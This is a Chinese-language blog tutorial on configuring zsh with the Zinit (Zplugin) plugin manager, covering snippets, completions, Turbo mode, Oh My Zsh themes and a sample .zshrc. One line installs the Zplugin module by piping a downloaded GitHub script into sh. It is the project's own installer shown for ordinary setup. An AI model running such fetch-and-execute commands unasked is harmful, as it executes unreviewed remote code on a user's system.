b4b4r07/httpstat</span><br></pre></td></tr></table></figure><p><code>atpull</code> 后面的命令以感叹号开头，意味着它会在 <code>git pull</code> 和 <code>mv</code> 之前被执行。此外 <code>atpull</code>, <code>mv</code>, <code>cp</code> 都只会在获取到新的提交的时候被执行。</p><p>总而言之，当用户执行 <code>zinit update b4b4r07/httpstat</code> 来升级这个插件的时候，如果有新 commit，首先执行的是 <code>git reset --hard</code>——它会恢复原来的 <code>httpstat.sh</code>，然后 <code>git pull</code>被执行并拉取新的 commit（进行快进），然后 <code>mv</code> 再次被执行将命令名称修改为 <code>httpstat</code> 而不是 <code>httpstat.sh</code>。这样 <code>mv</code> 可以用于永久性更新插件的内容而且不会阻碍插件使用 <code>git</code> （或 <code>subversion</code> ）更新。</p><blockquote><p>在 zsh 的交互式会话中，为了避免感叹号被展开，请使用 <code>'...'</code> 而不是 <code>&quot;...&quot;</code> 来包裹 <code>atpull</code> ice 的内容</p></blockquote><h2 id="通过-snippet-安装命令"><a class="headerlink" href="#通过-snippet-安装命令"></a>通过 snippet 安装命令</h2><p>也可以使用 snippet 添加命令。比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zinit ice mv<span class="string">"httpstat.sh -&gt; httpstat"</span> \</span><br><span class="line">        pick<span class="string">"httpstat"</span> as<span class="string">"program"</span></span><br><span class="line">zinit snippet \</span><br><span class="line">    https://github.com/b4b4r07/httpstat/blob/master/httpstat.sh</span><br></pre></td></tr></table></figure><p>注：Snippet 也支持 <code>atpull</code>，所以可以这样写 <code>atpull'!svn revert'</code> 。还有 <code>atinit</code>，可以在每次加载插件或 snippet 的时候被执行。</p><h2 id="通过-snippet-安装补全"><a class="headerlink" href="#通过-snippet-安装补全"></a>通过 snippet 安装补全</h2><p>以 <code>completion</code> 为参数调用 <code>as</code> ice，可以让 <code>snippet</code> 命令直接加载一个补全文件，比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zinit ice as<span class="string">"completion"</span></span><br><span class="line">zinit snippet https://github.com/docker/cli/blob/master/contrib/completion/zsh/_docker</span><br></pre></td></tr></table></figure><h2 id="补全管理"><a class="headerlink" href="#补全管理"></a>补全管理</h2><p>Zplugin 允许禁用/启动任意插件的任意一条补全。试着安装一个提供了补全的流行插件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zinit ice blockf</span><br><span class="line">zinit light zsh-users/zsh-completions</span><br></pre></td></tr></table></figure><p>第一条命令（<code>blockf</code> ice）将会阻断传统的添加补全的方式。zinit 会使用它自己的方式（基于符号链接而不是往 <code>$fpath</code> 里加一堆目录）。Zplugin 将会自动安装它下载的插件的补全。想要卸载这些补全并且重新安装的话，可以使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zinit cuninstall zsh-users/zsh-completions   <span class="comment"># 卸载</span></span><br><span class="line">zinit creinstall zsh-users/zsh-completions   <span class="comment"># 安装</span></span><br></pre></td></tr></table></figure><h3 id="列出补全"><a class="headerlink" href="#列出补全"></a>列出补全</h3><blockquote><p>注： <code>zi</code> 是一个可以在交互式会话中使用的别名</p></blockquote><p>要以表格形式查看每个插件都提供哪些补全和插件的名字，请使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zi clist</span><br></pre></td></tr></table></figure><p>这个命令特别适用于 <code>zsh-users/zsh-completions</code> 这类提供了大量补全的插件——表格每行将会展示三个补全（这样可以占用的终端页面的大小）就像这样</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">atach, bitcoin-cli, bower    zsh-users/zsh-completions</span><br><span class="line">bundle, caffeinate, <span class="built_in">cap</span>      zsh-users/zsh-completions</span><br><span class="line">cask, cf, chattr             zsh-users/zsh-completions</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>你也可以通过给 <code>clist</code> 添加参数来提高每行显示的补全的数目，比如 <code>zi clist 6</code> 将会显示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">bundle, caffeinate, <span class="built_in">cap</span>, cask, cf, chattr      zsh-users/zsh-completions</span><br><span class="line">cheat, choc, cmake, coffee, column, composer   zsh-users/zsh-completions</span><br><span class="line">console, dad, debuild, dget, dhcpcd, diana     zsh-users/zsh-completions</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="启用和禁用补全"><a class="headerlink" href="#启用和禁用补全"></a>启用和禁用补全</h2><p>补全可以被禁用，这样就可以调用 zsh 的原始补全。这个命令非常简单，它只需要补全的名称作为参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ zi cdisable cmake</span><br><span class="line">Disabled cmake completion belonging to zsh-users/zsh-completions</span><br><span class="line">$ zi cenable cmake</span><br><span class="line">Enabled cmake completion belonging to zsh-users/zsh-completions</span><br></pre></td></tr></table></figure><p>就这么简单。还有一个命令 <code>zinit csearch</code>，可以搜索所有的插件目录列出所有可用的补全并且展示它们是否被启用。</p><p><img src="https://zdharma.org/zinit/wiki/img/csearch.png" alt="#csearch screenshot"></p><p>这就实现了对补全的完全控制。</p><h2 id="子目录的-svn-支持"><a class="headerlink" href="#子目录的-svn-支持"></a>子目录的 SVN 支持</h2><p>通常，为了使用 GitHub 项目的子目录作为 snippet，需要在 URL中添加 <code>/trunk/{path-to-dir}</code>，比如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">zinit ice svn</span><br><span class="line">zinit snippet https://github.com/zsh-users/zsh-completions/trunk/src</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对于 Oh My Zsh 和 Prezto, 可以直接使用 OMZ:: 和 PZT:: 前缀</span></span><br><span class="line"><span class="comment"># 不需要添加 `/trunk/`， （不过路径需要指向一个目录而不是文件）</span></span><br><span class="line">zinit ice svn; zinit snippet PZT::modules/docker</span><br></pre></td></tr></table></figure><p>snippet 也会默认自动安全可用补全，就像 plugin 一样。</p><h2 id="turbo-mode-zsh-5-3"><a class="headerlink" href="#turbo-mode-zsh-5-3"></a>Turbo Mode (Zsh &gt;= 5.3)</h2><p><code>wait</code> ice 允许你将插件的加载过程延迟到 <code>.zshrc</code> 加载完成并且 prompt 已经显示出来以后。就像 Windows 一样——在启动过程中，即使后台依然在加载数据，它也会显示桌面。尽管这有缺点，不过总比黑屏十分钟要好。<br>然而，在 Zplugin 中，这个方法没有缺点——窗口不会延迟、冻结等等——在插件被加载的过程中，你的命令行完全处于可用状态，即使插件数量有十多二十个。</p><blockquote><p>Turbo mode 将会加速 zsh 的启动过程 50%～73% 之多。比如原先是 200ms，现在就只需要 50ms！</p></blockquote><p>这个功能需要 Zsh 5.3 及以上版本。为了使用 Turbo mode，可以参照以下方式为你的插件添加 <code>wait</code> ice：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS1=<span class="string">"READY &gt; "</span></span><br><span class="line">zinit ice <span class="built_in">wait</span><span class="string">'!0'</span> </span><br><span class="line">zinit load halfo/lambda-mod-zsh-theme</span><br></pre></td></tr></table></figure><p>上面的代码让 <code>psprint/zprompts</code> 插件在 <code>zshrc</code> 处理完毕后的 <code>0</code> 秒后启动。实际它会在基本的命令提示符 <code>READY &gt;</code> 出现后的大概 1ms 后启动。我已经使用这种方式来设置我的命令提示符两年多了，没有丝毫问题。 只提供 <code>wait</code> 一个词也是可以的，它的效果等同于 <code>wait'0'</code>（同样 <code>wait'!'</code>等同于 <code>wait'!0'</code>）</p><p>感叹号让 Zplugin 在插件加载完毕后重设命令提示符，对于延迟加载主题来说是很有必要的。Prezto 主题也是一样，下面的例子使用了更长的延迟</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zi ice svn silent <span class="built_in">wait</span><span class="string">'!1'</span> atload<span class="string">'prompt smiley'</span></span><br><span class="line">zi snippet PZT::modules/prompt</span><br></pre></td></tr></table></figure><p>延迟加载 <code>zsh-users/zsh-autosuggestions</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zinit ice <span class="built_in">wait</span> lucid atload<span class="string">'_zsh_autosuggest_start'</span></span><br><span class="line">zinit light zsh-users/zsh-autosuggestions</span><br></pre></td></tr></table></figure><p>解释：Autosuggesstions 使用了 <code>precmd</code> 钩子，它会在处理完 <code>zshrc</code> 之后（刚好在第一个命令提示符出现之前）被调用。然而 Turbo mode 会在 <code>zshrc</code> 加载完成 1s 后再加载它，使得在第一个命令提示符下 <code>precmd</code> 将不会被安装并调用。这就会让 autosuggesstions 在第一个命令提示符下处于不可用状态。但 <code>atload</code> ice 可以修复这个问题，它可以在插件加载完成后调用同样的函数，就像 <code>precmd</code> 做的那样，这样就可以获得一致的体验。</p><p><code>lucid</code> ice 可以隐藏 Turbo mode 下插件加载完成的提示，类似 <code>Loaded zsh-users/zsh-autosuggestions</code></p><h3 id="turbo-mode-加载复杂的命令提示符"><a class="headerlink" href="#turbo-mode-加载复杂的命令提示符"></a>Turbo Mode 加载复杂的命令提示符</h3><p>某些高级主题的初始化过程是通过 <code>precmd</code> 钩子完成的（一些需要在每个命令提示符出现之前被调用的函数）。这个钩子被通过 zsh 函数 <a href="https://zdharma.org/zinit/wiki/zsh-plugin-standard/#use_of_add-zsh-hook_to_install_hooks" target="_blank" rel="noopener">add-zsh-hook</a> 以将函数名添加到 <code>$precmd_functions</code> 数组中的方式被安装。</p><p>为了使命令提示符在用 Turbo mode 半路加载完主题后被完全初始化，需要使用 <code>atload''</code> ice 调用这个 hook。</p><p>首先，检查 <code>$precmd_function</code> 数字来获取钩子函数的名称。举例来说，在 <code>robobenklein/zinc</code> 主题中，将会有两个函数：<code>prompt_zinc_setup</code> 和 <code>prompt_zinc_precmd</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@sg &gt; ~ &gt; <span class="built_in">print</span> <span class="variable">$precmd_functions</span>                       &lt; ✔ &lt; 22:21:33</span><br><span class="line">_zsh_autosuggest_start prompt_zinc_setup prompt_zinc_precmd</span><br></pre></td></tr></table></figure><p>然后，把他们添加到 <code>atload''</code> ice 中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zinit ice <span class="built_in">wait</span><span class="string">'!'</span> lucid nocd \</span><br><span class="line">    atload<span class="string">'!prompt_zinc_setup; prompt_zinc_precmd'</span></span><br><span class="line">zinit load robobenklein/zinc</span><br></pre></td></tr></table></figure><p><code>atload'!...'</code> 中的感叹号会让 Zplugin 跟踪这个函数以便卸载插件，详见 <a href="https://zdharma.org/zinit/wiki/atload-and-other-at-ices/" target="_blank" rel="noopener">这儿</a>。这个对于接下来会提到的设置多个命令提示符会有用。</p><h2 id="按条件自动加载-卸载"><a class="headerlink" href="#按条件自动加载-卸载"></a>按条件自动加载/卸载</h2><p><code>load</code> 和 <code>unload</code> ice 允许你定义插件什么时候需要被激活或者禁用。举例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 处于 ~/tmp 时加载</span></span><br><span class="line"></span><br><span class="line">zinit ice load<span class="string">'![[ $PWD = */tmp* ]]'</span> unload<span class="string">'![[ $PWD != */tmp* ]]'</span> \</span><br><span class="line">    atload<span class="string">"!promptinit; prompt sprint3"</span></span><br><span class="line">zinit load psprint/zprompts</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不在 ~/tmp 时加载</span></span><br><span class="line"></span><br><span class="line">zinit ice load<span class="string">'![[ $PWD != */tmp* ]]'</span> unload<span class="string">'![[ $PWD = */tmp* ]]'</span></span><br><span class="line">zinit load russjohnson/angry-fly-zsh</span><br></pre></td></tr></table></figure><p>两个命令提示符，每个都在不同的目录下生效，这个技术可以用来定义不同的插件组，比如定义一个 <code>$PLUGINS</code> 和可能的值比如 <code>cpp</code>, <code>web</code>, <code>admin</code>，并且设置 <code>load</code>/<code>unload</code> 条件来激活 <code>cpp</code>， <code>web</code> 中不同的插件。</p><blockquote><p><code>load</code>/<code>unload</code>和 <code>wait</code> 的不同之处是它始处于激活状态，而不是只在只在第一次加载时有效。</p></blockquote><p>需要注意的是，要使卸载插件功能正常工作，你需要跟踪插件的加载过程（所以需要使用 <code>zinit load ...</code> 而不是 <code>zinit light ...</code>）。跟踪过程有轻微的性能损耗，不能在开启了 Turbo mode 后并不后影响 zsh 的启动时间。</p><p>可以参见 WIki 的 <a href="https://zdharma.org/zinit/wiki/Multiple-prompts/" target="_blank" rel="noopener">multi prompts</a> 一节，它包含了一个使用多个命令提示符的跟现实的例子，和作者自己目前所使用的类似。</p><h1 id="常见问题"><a class="headerlink" href="#常见问题"></a>常见问题</h1><h2 id="如何升级"><a class="headerlink" href="#如何升级"></a>如何升级</h2><p>使用 <code>zinit self-update</code> 可以升级 zinit</p><p>使用 <code>zinit update</code> 可以升级所有插件，也可以通过 <code>zinit update {插件名称}</code>来升级单个插件。</p><h2 id="如何使用-omz-主题"><a class="headerlink" href="#如何使用-omz-主题"></a>如何使用 OMZ 主题</h2><p>首先，OMZ 主题基本上都使用了 OMZ 提供的 git 库，因此使用这些主题之前需要先加载 git.zsh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zinit snippet OMZ::lib/git.zsh</span><br></pre></td></tr></table></figure><p>否则可能会收到这样的错误</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">........:1: <span class="built_in">command</span> not found: git_prompt_status</span><br><span class="line">........:1: <span class="built_in">command</span> not found: git_prompt_short_sha</span><br></pre></td></tr></table></figure><p>部分主题可能还需要加载 <code>OMZ::lib/theme-and-appearance.zsh</code></p><h2 id="为什么我的键位绑定失效了"><a class="headerlink" href="#为什么我的键位绑定失效了"></a>为什么我的键位绑定失效了</h2><p>因为以前 OMZ 替你做了绑定，不用 OMZ 当然就没有了。不过只要一行代码就能重新启用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接加载 OMZ 的键位绑定</span></span><br><span class="line">zinit snippet OMZ::lib/key-bindings.zsh</span><br></pre></td></tr></table></figure><h2 id="为什么我的补全失效了"><a class="headerlink" href="#为什么我的补全失效了"></a>为什么我的补全失效了</h2><p>因为以往也是 OMZ 替你做这件事情的……有两种解决办法</p><ol><li><p>如果你没有延迟加载任何补全相关的插件的话，直接在配置结尾加上下面的代码即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 初始化补全</span></span><br><span class="line"><span class="built_in">autoload</span> -Uz compinit; compinit</span><br><span class="line"><span class="comment"># zinit 出于效率考虑会截获 compdef 调用，放到最后再统一应用，可以节省不少时间</span></span><br><span class="line">zinit cdreplay -q</span><br></pre></td></tr></table></figure></li><li><p>如果你延迟加载了和补全有关的插件（但凡提供了补全就算），就比较复杂。一般推荐的做法是给最后一个被加载的补全相关的插件加上 <code>atload='zpcompinit; zpcdreplay'</code> 的修饰词。如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 假设 git 插件是最后加载的</span></span><br><span class="line">zinit ice lucid <span class="built_in">wait</span>=<span class="string">"0"</span> atload=<span class="string">"zpcompinit; zpcdreplay"</span></span><br><span class="line">zinit snippet OMZ::plugins/git/git.plugin.zsh</span><br></pre></td></tr></table></figure></li></ol><h1 id="zplugin-module"><a class="headerlink" href="#zplugin-module"></a>Zplugin Module</h1><p>这也是一个强力功能，不过在 Turbo Mode 的光环下就黯然失色了。</p><p>它的功能是自动编译被 source 的脚本，可以进一步提升启动速度。不过要注意这个过程中没有 alias 展开，因此不要在脚本中使用 alias。</p><p>而且它还有一个强大的功能——查看每个被 source 过的脚本的执行时间，由此可以迅速找出拖慢你 zsh 启动速度的元凶。</p><h2 id="安装方式"><a class="headerlink" href="#安装方式"></a>安装方式</h2><h3 id="未安装-zplugin"><a class="headerlink" href="#未安装-zplugin"></a>未安装 Zplugin</h3><p>没有安装 Zplugin 时也是可以使用这个模块的，对于某些不带编译功能的插件管理器来说有一定帮助。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(curl -fsSL https://raw.githubusercontent.com/zdharma/zinit/master/doc/mod-install.sh)</span>"</span></span><br></pre></td></tr></table></figure><p>脚本执行完会提示你添加两行代码到 <code>~/.zshrc</code> 顶部</p><h3 id="已安装-zplugin"><a class="headerlink" href="#已安装-zplugin"></a>已安装 Zplugin</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zinit module build</span><br></pre></td></tr></table></figure><p>同样，脚本执行完会提示你添加两行代码到 <code>~/.zshrc</code> 顶部</p><h3 id="用法"><a class="headerlink" href="#用法"></a>用法</h3><p>使用 <code>zpmod source-study</code> 就可以查看每个脚本的执行时间了，加上 <code>-l</code> 参数还可以显示脚本的完整路径。十分好用！</p><h1 id="关于-oh-my-zsh-碎碎念"><a class="headerlink" href="#关于-oh-my-zsh-碎碎念"></a>关于 Oh My Zsh 碎碎念</h1><p>有不少 zsh 用户都嫌弃 Oh My Zsh（以下简称 OMZ），主要嫌弃它的速度太慢。（还有很蛋疼的一点就是想找点 zsh 语法的教程看看，结果搜索结果清一色的 OMZ 配置教程，只有<a href="https://github.com/goreliu/zshguide" target="_blank" rel="noopener">一篇文章</a>是在讲 zsh 本身的。行吧，我去 RTFM 了。）</p><p>这个慢主要体现在三点：</p><h2 id="1-粘贴代码太慢"><a class="headerlink" href="#1-粘贴代码太慢"></a>1. 粘贴代码太慢</h2><p>这个确实没得洗，OMZ 默认启用了一个非常烦人的自动 URL 转义的功能。这个功能会<strong>极大</strong>拖慢粘贴的速度，而且这个功能在长达数年的时间里都是<strong>无法被除了修改源码以外的方式</strong>关闭的（<a href="https://github.com/robbyrussell/oh-my-zsh/issues/5569" target="_blank" rel="noopener">oh-my-zsh#5569</a>），直到今年五月份才终于加入了一个用于控制这个功能开关的变量，然而似乎还是默认开启的。这个功能不知道劝退了多少 OMZ 的用户……</p><p>总之，如果你是 OMZ 的忠实粉丝，看完本文后依然坚持使用 OMZ，建议立即更新并使用 <code>DISABLE_MAGIC_FUNCTIONS=true</code> 关闭这个功能。</p><h2 id="2-命令提示符响应太慢"><a class="headerlink" href="#2-命令提示符响应太慢"></a>2. 命令提示符响应太慢</h2><p>这个其实是可以洗的——你别选那么花哨的主题就行了啊。</p><p>拖慢命令提示符响应速度的大头是 git 信息的统计。这个功能其实挺不错的，然而会导致在首次进入大 repo 时卡顿，尤其是在 HDD 上，甚至能卡数秒，难以忍受。</p><p>那么 OMZ 有没有不显示git 信息的主题呢？</p><p>答案是没有……</p><p>那么简单的主题你好意思提交到 OMZ 上去吗！这样的主题只能自己写了，比如我用了挺久的 <a href="https://github.com/Aloxaf/dotfiles/blob/master/zsh/.config/zsh/custom/themes/loli.zsh-theme" target="_blank" rel="noopener">loli 主题</a> （然而没有任何 loli 要素）。</p><p>不过看完这篇文章你肯定会想，既然插件可以异步加载，git 信息可不可以异步加载呢？</p><p>答案是可以！一个著名主题 <a href="https://github.com/sindresorhus/pure" target="_blank" rel="noopener">Pure</a> 就是这么做的，兼顾了美观与实用性，即使再大的 repo 也能够秒进。</p><h2 id="3-启动速度太慢"><a class="headerlink" href="#3-启动速度太慢"></a>3. 启动速度太慢</h2><p>这个和 OMZ 没啥关系，主要是你插件太多了。除了 Zinit 外，其他插件管理器/框架都存在这个问题。</p><p>解决方案就是换 Zinit（其实还有一个实现了多线程加载的 Zplug，就是文章开头那张图中最慢的那一个……Zplug 的想法很好，但实现很挫）</p><h2 id="zinit-很强-但是我不想抛弃-omz-怎么办"><a class="headerlink" href="#zinit-很强-但是我不想抛弃-omz-怎么办"></a>Zinit 很强，但是我不想抛弃 OMZ 怎么办</h2><p>前面已经说了，Zinit 可以直接加载 OMZ 的插件，所以 OMZ 的好处你都能享受到。</p><p>当然，你会发现即使加载了 OMZ 插件，使用体验还是和 OMZ 不一致。<br>因为 zsh 的很多功能是默认没有开启的，你可以手动开启，或者如果你和我一样懒的话，还可以直接用 snippet 选择性加载 OMZ 的部分功能。举例如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zinit snippet OMZ::lib/completion.zsh</span><br><span class="line">zinit snippet OMZ::lib/history.zsh</span><br><span class="line">zinit snippet OMZ::lib/key-bindings.zsh</span><br><span class="line">zinit snippet OMZ::lib/theme-and-appearance.zsh</span><br></pre></td></tr></table></figure><p>上面的代码加载了 OMZ 对补全、历史、键位绑定、主题等的设置，对于我来说基本上和 OMZ 的使用体验就一致了。如果还想要什么功能的话，可以直接去 OMZ 的 lib 目录下找。</p><h1 id="一份示例配置"><a class="headerlink" href="#一份示例配置"></a>一份示例配置</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.zinit/bin/zinit.zsh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 快速目录跳转</span></span><br><span class="line">zinit ice lucid <span class="built_in">wait</span>=<span class="string">'1'</span></span><br><span class="line">zinit light skywind3000/z.lua</span><br><span class="line"></span><br><span class="line"><span class="comment"># 语法高亮</span></span><br><span class="line">zinit ice lucid <span class="built_in">wait</span>=<span class="string">'0'</span> atinit=<span class="string">'zpcompinit'</span></span><br><span class="line">zinit light zdharma/fast-syntax-highlighting</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动建议</span></span><br><span class="line">zinit ice lucid <span class="built_in">wait</span>=<span class="string">"0"</span> atload=<span class="string">'_zsh_autosuggest_start'</span></span><br><span class="line">zinit light zsh-users/zsh-autosuggestions</span><br><span class="line"></span><br><span class="line"><span class="comment"># 补全</span></span><br><span class="line">zinit ice lucid <span class="built_in">wait</span>=<span class="string">'0'</span></span><br><span class="line">zinit light zsh-users/zsh-completions</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载 OMZ 框架及部分插件</span></span><br><span class="line">zinit snippet OMZ::lib/completion.zsh</span><br><span class="line">zinit snippet OMZ::lib/history.zsh</span><br><span class="line">zinit snippet OMZ::lib/key-bindings.zsh</span><br><span class="line">zinit snippet OMZ::lib/theme-and-appearance.zsh</span><br><span class="line">zinit snippet OMZ::plugins/colored-man-pages/colored-man-pages.plugin.zsh</span><br><span class="line">zinit snippet OMZ::plugins/sudo/sudo.plugin.zsh</span><br><span class="line"></span><br><span class="line">zinit ice svn</span><br><span class="line">zinit snippet OMZ::plugins/extract</span><br><span class="line"></span><br><span class="line">zinit ice lucid <span class="built_in">wait</span>=<span class="string">'1'</span></span><br><span class="line">zinit snippet OMZ::plugins/git/git.plugin.zsh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载 pure 主题</span></span><br><span class="line">zinit ice pick<span class="string">"async.zsh"</span> src<span class="string">"pure.zsh"</span></span><br><span class="line">zinit light sindresorhus/pure</span><br></pre></td></tr></table></figure><p>安装完 Zinit 后，可以将以上代码粘贴到 <code>~/.zshrc</code> 中，然后建议<strong>挂着代理</strong>启用 zsh（因为会从 GitHub clone，所以第一次启动会比较慢，根据你的网络状况可能需要几十秒到几十分钟不等</p><p>本来还有一段安装一些常用工具的代码，不过一方面这些工具最好的安装方式应该是通过系统包管理工具安装，另一方面加上这段可能会让网络不好的朋友非常痛苦，故单独提出来放在下面。</p><p>需要的话可以把这段放到 source 后面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ---- (可选)加载了一堆二进制程序 ----</span></span><br><span class="line">zinit light zinit/z<span class="_">-a</span>-bin-gem-node</span><br><span class="line"></span><br><span class="line">zinit as=<span class="string">"null"</span> <span class="built_in">wait</span>=<span class="string">"1"</span> lucid from=<span class="string">"gh-r"</span> <span class="keyword">for</span> \</span><br><span class="line">    mv=<span class="string">"exa* -&gt; exa"</span> sbin       ogham/exa \</span><br><span class="line">    mv=<span class="string">"*/rg -&gt; rg"</span>  sbinBurntSushi/ripgrep \</span><br><span class="line">    mv=<span class="string">"fd* -&gt; fd"</span>   sbin=<span class="string">"fd/fd"</span>  @sharkdp/fd \</span><br><span class="line">    sbin=<span class="string">"fzf"</span>       junegunn/fzf-bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载它们的补全等</span></span><br><span class="line">zinit ice mv=<span class="string">"*.zsh -&gt; _fzf"</span> as=<span class="string">"completion"</span></span><br><span class="line">zinit snippet <span class="string">'https://github.com/junegunn/fzf/blob/master/shell/completion.zsh'</span></span><br><span class="line">zinit snippet <span class="string">'https://github.com/junegunn/fzf/blob/master/shell/key-bindings.zsh'</span></span><br><span class="line">zinit ice as=<span class="string">"completion"</span></span><br><span class="line">zinit snippet <span class="string">'https://github.com/robbyrussell/oh-my-zsh/blob/master/plugins/fd/_fd'</span></span><br><span class="line">zinit ice mv=<span class="string">"*.zsh -&gt; _exa"</span> as=<span class="string">"completion"</span></span><br><span class="line">zinit snippet <span class="string">'https://github.com/ogham/exa/blob/master/contrib/completions.zsh'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不需要花里胡哨的 ls，我们有更花里胡哨的 exa</span></span><br><span class="line">DISABLE_LS_COLORS=<span class="literal">true</span></span><br><span class="line"><span class="built_in">alias</span> ls=exa</span><br><span class="line"><span class="comment"># 配置 fzf 使用 fd</span></span><br><span class="line"><span class="built_in">export</span> FZF_DEFAULT_COMMAND=<span class="string">'fd --type f'</span></span><br><span class="line"><span class="comment"># ---- 加载完了 ----</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;2020-01-26 更新：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Zplugin 已改名 Zinit，不过教程中的内容仍然适用。&lt;br&gt;
阅读时请自行在脑中替换 （&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2020-01-14 更新：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;博主已经叛逃 powerlevel10k 了（注意是 10k 不是 9k）。&lt;br&gt;
p10k 的 Instant Prompt 功能非常好用，它可以在其他插件的加载过程中提供一个精简的 prompt 供使用，相当于后台加载。&lt;/p&gt;
&lt;p&gt;这个功能并不能加快实际的加载速度， 比如 &lt;code&gt;time zsh -ic &#39;exit&#39;&lt;/code&gt; 的结果仍然不会变，但是使用体验提升巨大（体验上几乎是瞬间加载）！&lt;/p&gt;
